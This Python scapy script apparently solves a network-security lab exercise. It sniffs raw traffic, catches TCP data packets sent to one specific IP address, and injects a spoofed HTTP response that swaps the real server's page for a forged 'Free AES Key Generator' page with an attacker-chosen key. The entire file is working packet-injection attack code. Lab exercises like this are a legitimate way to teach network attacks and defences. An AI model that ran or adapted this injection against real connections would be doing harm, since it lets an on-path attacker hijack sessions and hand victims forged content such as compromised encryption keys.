from scapy.all import send, conf, L3RawSocket
from scapy.all import TCP,IP,Ether
import socket

# Use this function to send packets
def inject_pkt(pkt):
    conf.L3socket=L3RawSocket
    send(pkt)

###
# edit this function to do your attack
###
def handle_pkt(pkt):
    
    a = Ether(pkt)
    if(IP in a and TCP in a):
    	if(a[IP].dst == "18.234.115.5" and a[TCP].flags =="PA"):
    		#print(a.show())
    		z = a
    		asrc = a[IP].src
    		adst =a[IP].dst
    		asrcp =a[TCP].sport
    		adstp = a[TCP].dport
    		aseq = a[TCP].seq
    		aack = a[TCP].ack                       
#   	 	
    		m ='HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Fri, 05 Nov 2021 05:09:25 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
    	
    		x = IP(src = adst, dst =asrc)/TCP(sport=adstp , dport = asrcp , seq = aack, ack = aseq, flags = 'PA')/m
    	
    		
    		#print(x.show())
    	
    		inject_pkt(x)
    
    pass

def main():
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__=='__main__':
    main()
